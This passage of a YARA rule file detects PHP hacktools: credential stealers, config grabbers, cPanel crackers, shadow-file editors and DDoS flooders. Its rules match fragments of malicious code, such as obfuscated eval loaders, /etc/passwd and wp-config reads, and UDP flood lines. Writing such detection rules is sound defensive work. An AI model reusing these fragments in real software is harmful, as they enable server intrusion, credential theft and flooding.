        $trigger and PR03873 and PR01490
}

private rule PR03874 : trigger
{
    strings:
        $ps0 = "mysql_fetch_row($botcheck);"
    condition:
        $ps0
}

private rule PR03875 : trigger
{
    strings:
        $ps0 = "addslashes(cleanstring(sXOR(hextostr($_POST"
    condition:
        $ps0
}

rule php_hacktool_botnet_CC_002 : hacktool
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR03874 and PR03875 and PR01362
}

private rule PR03876 : trigger
{
    strings:
        $ps0 = "SMOKE BOT | rev"
    condition:
        $ps0
}

rule php_hacktool_botnet_CC_003 : hacktool
{
    strings:
        $trigger = "file_"
    condition:
        $trigger and PR03876
}

rule php_hacktool_botnet_CC_004 : hacktool
{
    strings:
        $trigger = "RC4($input,pack(\"i\",decryptkey)"
    condition:
        $trigger and PR02208
}

private rule PR03877 : trigger
{
    strings:
        $ps0 = "die("
    condition:
        $ps0
}

private rule PR03878 : trigger
{
    strings:
        $ps0 = "`keylog_rules` TEXT NOT NULL"
    condition:
        $ps0
}

rule php_hacktool_botnet_CC_005 : hacktool
{
    strings:
        $trigger = "mysql"
    condition:
        $trigger and PR03877 and PR03878
}

rule php_hacktool_bruteforce_001 : hacktool
{
    strings:
        $trigger = "elseif(preg_match('/3[0-9]{2}/',$http_response_header[0])) { $s='success'; }"
    condition:
        $trigger and PR01425
}

rule php_hacktool_bruteforce_002 : hacktool
{
    strings:
        $trigger = "echo \"\\nBrute Force"
    condition:
        $trigger
}

private rule PR03879 : trigger
{
    strings:
        $ps0 = "return \"cracked\";"
    condition:
        $ps0
}

private rule PR03880 : trigger
{
    strings:
        $ps0 = "if (substr(trim($res), 0, 3) != \"+OK\") {"
    condition:
        $ps0
}

rule php_hacktool_bruteforce_003 : hacktool
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR03879 and PR03880
}

private rule PR03881 : trigger
{
    strings:
        $ps0 = "function check_acc($login,$pass,$serv,$port)"
    condition:
        $ps0
}

rule php_hacktool_bruteforce_004 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03881
}

private rule PR03882 : trigger
{
    strings:
        $ps0 = "curl_multi_add_handle($"
    condition:
        $ps0
}

private rule PR03883 : trigger
{
    strings:
        $ps0 = "array('status'=>'GOOD',"
    condition:
        $ps0
}

private rule PR03884 : trigger
{
    strings:
        $ps0 = "$info['http_code']"
    condition:
        $ps0
}

rule php_hacktool_bruteforce_005 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03882 and PR03883 and PR01021 and PR03884
}

private rule PR03885 : trigger
{
    strings:
        $ps0 = "return array('status'=>'GOOD','success'=>$brutePass['password']);"
    condition:
        $ps0
}

rule php_hacktool_bruteforce_007 : hacktool
{
    strings:
        $trigger = "$argv["
    condition:
        $trigger and PR00435 and PR03885
}

private rule PR03886 : trigger
{
    strings:
        $ps0 = ".'//'));"
    condition:
        $ps0
}

rule php_hacktool_bruteforce_008 : hacktool
{
    strings:
        $trigger = ",array('','}'.$"
    condition:
        $trigger and PR03886 and PR01016
}

rule php_hacktool_cc_bin_id_001 : hacktool
{
    strings:
        $trigger = "echo \"Put The First 6 Code Of The Card\";"
    condition:
        $trigger
}

rule php_hacktool_check_requirements_001 : hacktool
{
    strings:
        $trigger = "$result[] = 'The script requires one of the following operating systems"
    condition:
        $trigger and PR00092
}

rule php_hacktool_check_requirements_002 : hacktool
{
    strings:
        $trigger = "echo $ok ? \"SHELL_OK\" : \"SHELL_BAD\";"
    condition:
        $trigger
}

private rule PR03887 : trigger
{
    strings:
        $ps0 = "$webz=$_POST["
    condition:
        $ps0
}

private rule PR03888 : trigger
{
    strings:
        $ps0 = "$uri_in=$_POST"
    condition:
        $ps0
}

private rule PR03889 : trigger
{
    strings:
        $ps0 = "(function_exists('curl_init'))"
    condition:
        $ps0
}

rule php_hacktool_check_requirements_003 : hacktool
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR03887 and PR03888 and PR03889
}

rule php_hacktool_checkandall_001 : hacktool
{
    strings:
        $trigger = "function GetListFiles($folder,&$all_files){"
    condition:
        $trigger
}

rule php_hacktool_checker_codsec_001 : hacktool
{
    strings:
        $trigger = "<title>Checker By CodSec<"
    condition:
        $trigger and PR01401
}

private rule PR03890 : trigger
{
    strings:
        $ps0 = ">Bypass Chmod"
    condition:
        $ps0
}

rule php_hacktool_chmod_001 : hacktool
{
    strings:
        $trigger = "($_POST)"
    condition:
        $trigger and PR03890
}

rule php_hacktool_cms_credentials_stealer_001 : hacktool
{
    strings:
        $trigger = "echo \"<mysqlpass>\".$pass[1][0].\"</mysqlpass><br>\""
    condition:
        $trigger and PR00507
}

rule php_hacktool_cms_credentials_stealer_002 : hacktool
{
    strings:
        $trigger = "echo $line[\"user_login\"].\"<|>\".$line[\"user_pass\"].\"|new|\";"
    condition:
        $trigger and PR01837
}

rule php_hacktool_cms_credentials_stealer_003 : hacktool
{
    strings:
        $trigger = "public $codeReplaceTemplate = 'function the_replacing($"
    condition:
        $trigger and PR01425
}

private rule PR03891 : trigger
{
    strings:
        $ps0 = "$bodys = array('u' => $username,'p' => $password"
    condition:
        $ps0
}

private rule PR03892 : trigger
{
    strings:
        $ps0 = "$ips = isset($_SERVER['HTTP_CF_CONNECTING_IP"
    condition:
        $ps0
}

rule php_hacktool_cms_credentials_stealer_004 : hacktool
{
    strings:
        $trigger = "$requests->request( $urls, array( 'method' => 'POST"
    condition:
        $trigger and PR03891 and PR03892
}

private rule PR03893 : trigger
{
    strings:
        $ps0 = "$pass=explode(\"';\",$pass[1]);"
    condition:
        $ps0
}

rule php_hacktool_cms_credentials_stealer_005 : hacktool
{
    strings:
        $trigger = "or (\"../../config/settings.inc.php\") or (\"../../../config/settings.inc.php"
    condition:
        $trigger and PR00507 and PR03893
}

private rule PR03894 : trigger
{
    strings:
        $ps0 = "@$_REQUEST['icn'].'|'.@$_REQUEST['icm'].'|'.@$_REQUEST['icy']."
    condition:
        $ps0
}

rule php_hacktool_cms_credentials_stealer_006 : hacktool
{
    strings:
        $trigger = "preg_match('/<password><!\\[CDATA\\[(.*?)\\]\\]><\\/password>/i',"
    condition:
        $trigger and PR00435 and PR03894
}

rule php_hacktool_cms_credentials_stealer_007 : hacktool
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('bY7fCoIwHIXvB"
    condition:
        $trigger
}

rule php_hacktool_cms_credentials_stealer_008 : hacktool
{
    strings:
        $trigger = "$smail=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'].\"|\".$this->request->post['username"
    condition:
        $trigger and PR00301 and PR01123
}

private rule PR03895 : trigger
{
    strings:
        $ps0 = "$smail=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'].\"|\".$this->request->post['username"
    condition:
        $ps0
}

rule php_hacktool_cms_credentials_stealer_008_02 : hacktool
{
    strings:
        $trigger = "html_entity_decode($this->request->post['password"
    condition:
        $trigger and PR00301 and PR03895
}

rule php_hacktool_cms_credentials_stealer_009 : hacktool
{
    strings:
        $trigger = "assword=\".($data"
    condition:
        $trigger and PR00091 and PR00341 and PR00342
}

private rule PR03896 : trigger
{
    strings:
        $ps0 = "$addOk = true"
    condition:
        $ps0
}

rule php_hacktool_cms_credentials_stealer_010 : hacktool
{
    strings:
        $trigger = "preg_replace('/(htdocs|httpdocs|www)(.*)/','$1',dirname($_SERVER[\"SCRIPT_FILENAME\"]"
    condition:
        $trigger and PR03896 and PR01021 and PR01431
}

private rule PR03897 : trigger
{
    strings:
        $ps0 = "$subject='Wordpress Pass"
    condition:
        $ps0
}

rule php_hacktool_cms_credentials_stealer_011 : hacktool
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR00437 and PR00301 and PR03897
}

private rule PR03898 : trigger
{
    strings:
        $ps0 = "fwrite($hellowp,$username_password,$time);"
    condition:
        $ps0
}

rule php_hacktool_cms_credentials_stealer_012 : hacktool
{
    strings:
        $trigger = "POST"
    condition:
        $trigger and PR03898
}

private rule PR03899 : trigger
{
    strings:
        $ps0 = "/index.php?option=com_myblog&task=ajaxupload\");"
    condition:
        $ps0
}

rule php_hacktool_com_myblog_exploit_001 : hacktool
{
    strings:
        $trigger = ".php.jpg"
    condition:
        $trigger and PR00507 and PR03899
}

rule php_hacktool_configuration_stealer_001 : hacktool
{
    strings:
        $trigger = "<title>--==[[Configuration File Killer By Team IndiShell]]==--</title>"
    condition:
        $trigger
}

rule php_hacktool_configuration_stealer_002 : hacktool
{
    strings:
        $trigger = "<title>CiH Symlink</title>"
    condition:
        $trigger
}

private rule PR03900 : trigger
{
    strings:
        $ps0 = "CiH_H@CkErZ"
    condition:
        $ps0
}

rule php_hacktool_configuration_stealer_002_001 : hacktool
{
    strings:
        $trigger = "config"
    condition:
        $trigger and PR03900
}

private rule PR03901 : trigger
{
    strings:
        $ps0 = "$link = getcwd() . \"/\" . $flib;"
    condition:
        $ps0
}

rule php_hacktool_configuration_stealer_002_002 : hacktool
{
    strings:
        $trigger = "config"
    condition:
        $trigger and PR03901
}

rule php_hacktool_configuration_stealer_003 : hacktool
{
    strings:
        $trigger = "echo detect_cms().'|';"
    condition:
        $trigger
}

private rule PR03902 : trigger
{
    strings:
        $ps0 = "> Server Jumping Finder Version 1.0"
    condition:
        $ps0
}

rule php_hacktool_configuration_stealer_004 : hacktool
{
    strings:
        $trigger = "/etc/"
    condition:
        $trigger and PR03902
}

private rule PR03903 : trigger
{
    strings:
        $ps0 = "<title>Config Bot"
    condition:
        $ps0
}

rule php_hacktool_configuration_stealer_005 : hacktool
{
    strings:
        $trigger = "config"
    condition:
        $trigger and PR03903
}

rule php_hacktool_configuration_stealer_006 : hacktool
{
    strings:
        $trigger = "=[File Finder Coy"
    condition:
        $trigger
}

rule php_hacktool_configuration_stealer_007 : hacktool
{
    strings:
        $trigger = "(str_rot13(base64_decode(($mrsimple)"
    condition:
        $trigger
}

rule php_hacktool_configuration_stealer_009 : hacktool
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('FZnHjoRYEkX3/SPTLRaQeDS"
    condition:
        $trigger
}

private rule PR03904 : trigger
{
    strings:
        $ps0 = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBl"
    condition:
        $ps0
}

rule php_hacktool_configuration_stealer_011 : hacktool
{
    strings:
        $trigger = "isset($_POST["
    condition:
        $trigger and PR03904
}

private rule PR03905 : trigger
{
    strings:
        $ps0 = "$aus = file($f);"
    condition:
        $ps0
}

rule php_hacktool_configuration_stealer_012 : hacktool
{
    strings:
        $trigger = "$f = $_SERVER['DOCUMENT_ROOT'] . '/configuration.php';"
    condition:
        $trigger and PR03905 and PR01458
}

rule php_hacktool_configuration_stealer_013 : hacktool
{
    strings:
        $trigger = "<title>Configs Grabber By Thex@b1"
    condition:
        $trigger
}

private rule PR03906 : trigger
{
    strings:
        $ps0 = ">Extract Emails From [ OpenCart - WordPress - Joomla - WHMCS"
    condition:
        $ps0
}

rule php_hacktool_configuration_stealer_014 : hacktool
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR00507 and PR03906
}

private rule PR03907 : trigger
{
    strings:
        $ps0 = "case 'i': phpinfo();"
    condition:
        $ps0
}

private rule PR03908 : trigger
{
    strings:
        $ps0 = "case 'g': $this->get_properties();"
    condition:
        $ps0
}

rule php_hacktool_configuration_stealer_015 : hacktool
{
    strings:
        $trigger = "header('Content-Type:"
    condition:
        $trigger and PR01021 and PR03907 and PR01431 and PR03908
}

private rule PR03909 : trigger
{
    strings:
        $ps0 = "['password'], $cc_encryption_hash);"
    condition:
        $ps0
}

private rule PR03910 : trigger
{
    strings:
        $ps0 = "echo(\"<center>Domain Reseller"
    condition:
        $ps0
}

rule php_hacktool_configuration_stealer_016 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03909 and PR01350 and PR03910
}

private rule PR03911 : trigger
{
    strings:
        $ps0 = "preg_match_all('/(.*?):x:/', $passwd, $user_jumping);"
    condition:
        $ps0
}

rule php_hacktool_configuration_stealer_017 : hacktool
{
    strings:
        $trigger = "str_replace"
    condition:
        $trigger and PR03911
}

private rule PR03912 : trigger
{
    strings:
        $ps0 = "$disFuns=get_cfg_var(\"disable_functions\");"
    condition:
        $ps0
}

rule php_hacktool_configuration_stealer_018 : hacktool
{
    strings:
        $trigger = "exit;"
    condition:
        $trigger and PR00039 and PR02056 and PR03912
}

private rule PR03913 : trigger
{
    strings:
        $ps0 = "a:1:{s:13:\\\"administrator\\\";s:1:\\\"1\\\";}\")"
    condition:
        $ps0
}

private rule PR03914 : trigger
{
    strings:
        $ps0 = "preg_match('/(.+?);(.+?);(.+?);(.+?);(.*)/', $buffer, $config);"
    condition:
        $ps0
}

private rule PR03915 : trigger
{
    strings:
        $ps0 = "echo \"site = $url[0]\\n\";"
    condition:
        $ps0
}

rule php_hacktool_configuration_stealer_019 : hacktool
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR03913 and PR03914 and PR01362 and PR03915
}

// MANUAL FIX NECESSARY
rule php_hacktool_configuration_stealer_020 : hacktool
{
    strings:
        $trigger = "isset($_POST["
        $php_hacktool_configuration_stealer_020_r0 = /symlink\(.\/home\/.\.\$[\w]+\..\/public_html[^\)]+\);/
    condition:
        $trigger and $php_hacktool_configuration_stealer_020_r0
}

private rule PR03916 : trigger
{
    strings:
        $ps0 = "fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');"
    condition:
        $ps0
}

rule php_hacktool_configuration_stealer_021 : hacktool
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR01362 and PR03916
}

private rule PR03917 : trigger
{
    strings:
        $ps0 = "$wpdb->prefix.'users set user_login = \"wpgateway_sec_admin"
    condition:
        $ps0
}

rule php_hacktool_configuration_stealer_022 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03917 and PR00357
}

private rule PR03918 : trigger
{
    strings:
        $ps0 = "WHMCS/.htaccess"
    condition:
        $ps0
}

rule php_hacktool_configuration_stealer_023 : hacktool
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR01553 and PR03918 and PR01362 and PR03085
}

rule php_hacktool_configuration_stealer_024 : hacktool
{
    strings:
        $trigger = "$dirz = '/home/'.$username.'/public_html/';"
    condition:
        $trigger and PR00042
}

private rule PR03919 : trigger
{
    strings:
        $ps0 = "fwrite($fw, \"GET \" . var_export($_GET, true));"
    condition:
        $ps0
}

rule php_hacktool_configuration_stealer_025 : hacktool
{
    strings:
        $trigger = "$file_get = $_SERVER[\"DOCUMENT_ROOT\"]"
    condition:
        $trigger and PR03919
}

private rule PR03920 : trigger
{
    strings:
        $ps0 = "<div class=\"heading\"><h1>Magento Current Configuration</h1></div>"
    condition:
        $ps0
}

rule php_hacktool_configuration_stealer_026 : hacktool
{
    strings:
        $trigger = "<td><?=$xml->global->resources->default_setup->connection->dbname?></td>"
    condition:
        $trigger and PR00042 and PR03920
}

rule php_hacktool_configuration_stealer_027 : hacktool
{
    strings:
        $trigger = "error_reporting(0); echo php_uname().\"<br>\".getcwd().\"<br>\";  ?>"
    condition:
        $trigger and PR01975
}

private rule PR03921 : trigger
{
    strings:
        $ps0 = "echo htmlentities(file_get_contents(\"../"
    condition:
        $ps0
}

rule php_hacktool_configuration_stealer_028 : hacktool
{
    strings:
        $trigger = "wp-config.php"
    condition:
        $trigger and PR03921
}

rule php_hacktool_cpaneladmin_creator_001 : hacktool
{
    strings:
        $trigger = "(!file_exists($whm_interface_path))"
    condition:
        $trigger
}

private rule PR03922 : trigger
{
    strings:
        $ps0 = "accesshash"
    condition:
        $ps0
}

private rule PR03923 : trigger
{
    strings:
        $ps0 = "/home"
    condition:
        $ps0
}

private rule PR03924 : trigger
{
    strings:
        $ps0 = "if(file_exists($"
    condition:
        $ps0
}

rule php_hacktool_cpaneladmin_creator_002 : hacktool
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR03922 and PR03923 and PR01362 and PR03924
}

private rule PR03925 : trigger
{
    strings:
        $ps0 = "cpanel_check"
    condition:
        $ps0
}

rule php_hacktool_cpanel_bruteforce_001 : hacktool
{
    strings:
        $trigger = "$cracktype=$_REQUEST['cracktype'];"
    condition:
        $trigger and PR01401 and PR03925
}

private rule PR03926 : trigger
{
    strings:
        $ps0 = ">Cpanel Cracker"
    condition:
        $ps0
}

rule php_hacktool_cpanel_bruteforce_003 : hacktool
{
    strings:
        $trigger = "/etc/"
    condition:
        $trigger and PR03926
}

private rule PR03927 : trigger
{
    strings:
        $ps0 = ">Pr1v4t3 Cpan3l Us3r Ch3cker"
    condition:
        $ps0
}

rule php_hacktool_cpanel_bruteforce_004 : hacktool
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR03927
}

private rule PR03928 : trigger
{
    strings:
        $ps0 = "Script: Cpanel + FTP Cracker"
    condition:
        $ps0
}

rule php_hacktool_cpanel_bruteforce_005 : hacktool
{
    strings:
        $trigger = "/etc/"
    condition:
        $trigger and PR03928
}

rule php_hacktool_cpanel_bruteforce_006 : hacktool
{
    strings:
        $trigger = "<title>1337w0rm"
    condition:
        $trigger
}

private rule PR03929 : trigger
{
    strings:
        $ps0 = "/* RetnOHacK 2013 */ "
    condition:
        $ps0
}

rule php_hacktool_cpanel_bruteforce_006_001 : hacktool
{
    strings:
        $trigger = "hell"
    condition:
        $trigger and PR03929
}

rule php_hacktool_cpanel_bruteforce_006_002 : hacktool
{
    strings:
        $trigger = "cPanel Cracker</title>"
    condition:
        $trigger and PR00042
}

rule php_hacktool_cpanel_bruteforce_006_03 : hacktool
{
    strings:
        $trigger = "<option value=\"shell_exec\">shell_exec</option>"
    condition:
        $trigger
}

private rule PR03930 : trigger
{
    strings:
        $ps0 = ">Automatic cPanel Finder/Cracker"
    condition:
        $ps0
}

rule php_hacktool_cpanel_bruteforce_007 : hacktool
{
    strings:
        $trigger = "/etc/"
    condition:
        $trigger and PR03930
}

private rule PR03931 : trigger
{
    strings:
        $ps0 = "#   Script: Cpanel + FTP Cracker              |"
    condition:
        $ps0
}

rule php_hacktool_cpanel_bruteforce_008 : hacktool
{
    strings:
        $trigger = "Hack"
    condition:
        $trigger and PR03931
}

rule php_hacktool_cpanel_bruteforce_009 : hacktool
{
    strings:
        $trigger = ">Automatic cPanel Finder"
    condition:
        $trigger and PR00247
}

private rule PR03932 : trigger
{
    strings:
        $ps0 = ".\"/.accesshash\";$"
    condition:
        $ps0
}

rule php_hacktool_cpanel_bruteforce_010 : hacktool
{
    strings:
        $trigger = ";ob_start();echo\"http://$"
    condition:
        $trigger and PR03932 and PR00301
}

rule php_hacktool_cpanel_bruteforce_011 : hacktool
{
    strings:
        $trigger = "PD9waHANCg0KQGluaV9zZXQoJ2Rpc3BsYXlfZXJyb3JzJywwKTsNCm"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR03933 : trigger
{
    strings:
        $ps0 = "fopen('/etc/passwd"
    condition:
        $ps0
}

private rule PR03934 : trigger
{
    strings:
        $ps0 = ">Automatic cPanel Cracker<"
    condition:
        $ps0
}

rule php_hacktool_cpanel_bruteforce_012 : hacktool
{
    strings:
        $trigger = "file_get_contents(\"http://pastebin.com/raw"
    condition:
        $trigger and PR03933 and PR01403 and PR03934
}

rule php_hacktool_cpanel_bruteforce_013 : hacktool
{
    strings:
        $trigger = "7X12e6PGsvB052zyHzjEN7KvPBZPu3o50Yb2fdfMPD6AS7SxgwTn5P72292ABJI8W2Vm3g+vJ7"
    condition:
        $trigger and PR01422 and PR01372
}

private rule PR03935 : trigger
{
    strings:
        $ps0 = "name=cpanelcracking"
    condition:
        $ps0
}

rule php_hacktool_cpanel_bruteforce_014 : hacktool
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR03935 and PR01543 and PR01403 and PR01415
}

private rule PR03936 : trigger
{
    strings:
        $ps0 = "/resetpass?start=1'"
    condition:
        $ps0
}

private rule PR03937 : trigger
{
    strings:
        $ps0 = "/.cpanel/contactinfo', 'w')"
    condition:
        $ps0
}

rule php_hacktool_cpanel_reset_password_001 : hacktool
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR03936 and PR03937 and PR00397
}

private rule PR03938 : trigger
{
    strings:
        $ps0 = "IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojI1NjcmlwdCBSZXNldHBhc3MgQ3B"
    condition:
        $ps0
}

rule php_hacktool_cpanel_reset_password_002 : hacktool
{
    strings:
        $trigger = "eval(base64_decode"
    condition:
        $trigger and PR03938
}

rule php_hacktool_cpanel_reset_password_003 : hacktool
{
    strings:
        $trigger = "LmNwYW5lbC9jb250YWN0aW5m"
    condition:
        $trigger and PR01398
}

private rule PR03939 : trigger
{
    strings:
        $ps0 = "/cpanel3-skel"
    condition:
        $ps0
}

private rule PR03940 : trigger
{
    strings:
        $ps0 = "if((preg_match(\"/resetpass/"
    condition:
        $ps0
}

rule php_hacktool_cpanel_reset_password_004 : hacktool
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02458 and PR00507 and PR03939 and PR03940
}

private rule PR03941 : trigger
{
    strings:
        $ps0 = "if(!(preg_match(\"/resetpass"
    condition:
        $ps0
}

rule php_hacktool_cpanel_reset_password_005 : hacktool
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR01553 and PR01362 and PR03085 and PR03941
}

private rule PR03942 : trigger
{
    strings:
        $ps0 = ":2082/resetpass?user="
    condition:
        $ps0
}

rule php_hacktool_cpanel_reset_password_006 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR03942 and PR00357
}

private rule PR03943 : trigger
{
    strings:
        $ps0 = "base64_decode(strrev(str_rot13(explode(base64_decode("
    condition:
        $ps0
}

rule php_hacktool_cpanel_reset_password_007 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03943
}

rule php_hacktool_cpanel_reset_password_008 : hacktool
{
    strings:
        $trigger = "/resetpass"
    condition:
        $trigger and PR01553 and PR01401 and PR03786
}

private rule PR03944 : trigger
{
    strings:
        $ps0 = "fopen('/home/'.$user.'/etc/'.$"
    condition:
        $ps0
}

rule php_hacktool_cpanel_user_shadow_editor_001 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR03944
}

private rule PR03945 : trigger
{
    strings:
        $ps0 = "$file=\"$path/$b/shadow\""
    condition:
        $ps0
}

rule php_hacktool_cpanel_user_shadow_editor_002 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR03945 and PR00357
}

private rule PR03946 : trigger
{
    strings:
        $ps0 = "/shadow"
    condition:
        $ps0
}

private rule PR03947 : trigger
{
    strings:
        $ps0 = "$ports = array(25, 587, 465, 110, 995, 143, 993);"
    condition:
        $ps0
}

rule php_hacktool_cpanel_user_shadow_editor_003 : hacktool
{
    strings:
        $trigger = "header('Content-Type:"
    condition:
        $trigger and PR01021 and PR03946 and PR03947 and PR01431
}

private rule PR03948 : trigger
{
    strings:
        $ps0 = "dovecot-acl-list\";fwrite(fopen($"
    condition:
        $ps0
}

rule php_hacktool_cpanel_user_shadow_editor_004 : hacktool
{
    strings:
        $trigger = "/etc/"
    condition:
        $trigger and PR03855 and PR03948
}

private rule PR03949 : trigger
{
    strings:
        $ps0 = "$val) { curl_setopt($ch, $opt, $val); }"
    condition:
        $ps0
}

rule php_hacktool_curl_proxy_001 : hacktool
{
    strings:
        $trigger = "base64_decode($_POST["
    condition:
        $trigger and PR03949
}

private rule PR03950 : trigger
{
    strings:
        $ps0 = "} while (strpos($headers, \"\\r\\n\\r\\n\") === false);"
    condition:
        $ps0
}

private rule PR03951 : trigger
{
    strings:
        $ps0 = "if (preg_match(\"/'DB_HOST"
    condition:
        $ps0
}

rule php_hacktool_databasemanager_002 : hacktool
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR03950 and PR03951 and PR00397
}

rule php_hacktool_databasemanager_003 : hacktool
{
    strings:
        $trigger = "search replace db</title>"
    condition:
        $trigger and PR00042
}

private rule PR03952 : trigger
{
    strings:
        $ps0 = "<font size=\"4\"><? echo 'Vty - "
    condition:
        $ps0
}

rule php_hacktool_databasemanager_004 : hacktool
{
    strings:
        $trigger = "$key"
    condition:
        $trigger and PR03952 and PR00029 and PR01422
}

private rule PR03953 : trigger
{
    strings:
        $ps0 = "class icit_srdb"
    condition:
        $ps0
}

rule php_hacktool_dbshell_002 : hacktool
{
    strings:
        $trigger = "$search, $replace,"
    condition:
        $trigger and PR03953 and PR01480
}

private rule PR03954 : trigger
{
    strings:
        $ps0 = "echo \"<table><form method='get' action='wpq.php'><tr><td><label>Stylesheet:"
    condition:
        $ps0
}

rule php_hacktool_dbshell_003 : hacktool
{
    strings:
        $trigger = "Login"
    condition:
        $trigger and PR00042 and PR03954
}

private rule PR03955 : trigger
{
    strings:
        $ps0 = "DDOS"
    condition:
        $ps0
}

rule php_hacktool_ddos_001 : hacktool
{
    strings:
        $trigger = "PHP DDoS"
    condition:
        $trigger and PR03955
}

private rule PR03956 : trigger
{
    strings:
        $ps0 = "$_GET['method'])) exit(\"target,"
    condition:
        $ps0
}

rule php_hacktool_ddos_002 : hacktool
{
    strings:
        $trigger = "DDOS"
    condition:
        $trigger and PR03956
}

rule php_hacktool_ddos_003_001 : hacktool
{
    strings:
        $trigger = "AnonGhost PHP DDOS"
    condition:
        $trigger
}

rule php_hacktool_ddos_003_002 : hacktool
{
    strings:
        $trigger = "<input type=\"submit\" value=\"    Launch DDOS Attack    \">"
    condition:
        $trigger
}

rule php_hacktool_ddos_003_003 : hacktool
{
    strings:
        $trigger = "print \"Flooded: $ip on port $rand <br><br>\";"
    condition:
        $trigger and PR03955
}

private rule PR03957 : trigger
{
    strings:
        $ps0 = "$out.= \"XXDD0S\".$dosstr"
    condition:
        $ps0
}

rule php_hacktool_ddos_004 : hacktool
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR03957
}

rule php_hacktool_ddos_005 : hacktool
{
    strings:
        $trigger = "$sock = @fsockopen(\"udp://{$_GET['ip']}\""
    condition:
        $trigger
}

rule php_hacktool_ddos_006 : hacktool
{
    strings:
        $trigger = "$sock = @fsockopen(\"tcp://{$_GET['ip']}\""
    condition:
        $trigger
}

private rule PR03958 : trigger
{
    strings:
        $ps0 = "pTjpdqLY1v/zFMT4dTQmCiIOnaI6ioAjIohTp"
    condition:
        $ps0
}

rule php_hacktool_ddos_007 : hacktool
{
    strings:
        $trigger = "onfr64_qrpbqr"
    condition:
        $trigger and PR03958 and PR01372
}

rule php_hacktool_ddos_008 : hacktool
{
    strings:
        $trigger = "DDoS-PHP"
    condition:
        $trigger and PR03955
}

private rule PR03959 : trigger
{
    strings:
        $ps0 = "PHP DDoS Bot"
    condition:
        $ps0
}

rule php_hacktool_ddos_009 : hacktool
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR03959
}

private rule PR03960 : trigger
{
    strings:
        $ps0 = "TCP Flood</b><br>Completed"
    condition:
        $ps0
}

rule php_hacktool_ddos_010 : hacktool
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR03960
}

private rule PR03961 : trigger
{
    strings:
        $ps0 = "$packets = $_POST["
    condition:
        $ps0
}

private rule PR03962 : trigger
{
    strings:
        $ps0 = "print \"<font color=green><b>"
    condition:
        $ps0
}

private rule PR03963 : trigger
{
    strings:
        $ps0 = "fsockopen(\"udp://$ip\", $rand, $errno, $errstr"
    condition:
        $ps0
}

rule php_hacktool_ddos_011 : hacktool
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR03961 and PR03962 and PR03963
}

private rule PR03964 : trigger
{
    strings:
        $ps0 = "_SERVER['REMOTE_ADDR"
    condition:
        $ps0
}

rule php_hacktool_ddos_011_02 : hacktool
{
    strings:
        $trigger = "input type=\"text\" name=\"packetsize\""
    condition:
        $trigger and PR03964
}

private rule PR03965 : trigger
{
    strings:
        $ps0 = "echo \"Packet complete at \".time('h:i:s').\" with $packets"
    condition:
        $ps0
}

rule php_hacktool_ddos_012 : hacktool
{
    strings:
        $trigger = "POST"
    condition:
        $trigger and PR03965
}

private rule PR03966 : trigger
{
    strings:
        $ps0 = "round($packets/$exec_time,"
    condition:
        $ps0
}

rule php_hacktool_ddos_013 : hacktool
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR03966
}

rule php_hacktool_ddos_013_02 : hacktool
{
    strings:
        $trigger = "<title>DDoS UDP Flood"
    condition:
        $trigger and PR00044
}

private rule PR03967 : trigger
{
    strings:
        $ps0 = "parse_url($"
    condition:
        $ps0
}

private rule PR03968 : trigger
{
    strings:
        $ps0 = "usleep($delay_between_requests"
    condition:
        $ps0
}

rule php_hacktool_ddos_014 : hacktool
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR01403 and PR03967 and PR03968
}

private rule PR03969 : trigger
{
    strings:
        $ps0 = "while(!feof($"
    condition:
        $ps0
}

private rule PR03970 : trigger
{
    strings:
        $ps0 = "$linux_proc[array_rand($linux_proc"
    condition:
        $ps0
}

rule php_hacktool_ddos_015 : hacktool
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR03969 and PR03970
}

rule php_hacktool_deface_auto_notifier_001 : hacktool
{
    strings:
        $trigger = "CURLOPT_URL, \"http://aljyyosh.org/single.php\""
    condition:
        $trigger
}

private rule PR03971 : trigger
{
    strings:
        $ps0 = ">Deface Page Checker"
    condition:
        $ps0
}

rule php_hacktool_deface_checker_001 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03971 and PR01021 and PR02843
}

private rule PR03972 : trigger
{
    strings:
